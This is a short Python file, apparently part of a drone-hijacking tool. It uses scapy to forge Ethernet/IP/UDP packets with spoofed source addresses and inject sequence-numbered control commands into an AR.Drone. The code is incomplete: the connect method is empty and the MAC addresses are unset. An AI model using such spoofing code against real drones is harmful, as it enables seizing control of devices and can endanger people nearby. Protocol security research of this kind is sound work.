from scapy.layers.inet import IP, UDP, Ether
from scapy.all import sendp


class ARDrone:
    def __init__(self, drone_config):
        self.iface = drone_config['connection']['iface']
        self.src_ip = drone_config['connection']['src_ip']
        self.dst_ip = drone_config['connection']['dst_ip']
        self.src_port = drone_config['connection']['src_port']
        self.dst_port = drone_config['connection']['dst_port']
        self.src_mac = None
        self.dst_mac = None

    def connect(self):
        pass

    def command(self, command, seq):
        spoofed_packet = Ether(src=self.src_mac,
                               dst=self.dst_mac) / IP(src=self.src_ip,
                               dst=self.dst_ip) / UDP(sport=self.src_port,
                               dport=self.dst_port) / command.replace("<sequence-number>", seq)
        sendp(spoofed_packet, iface=self.iface)
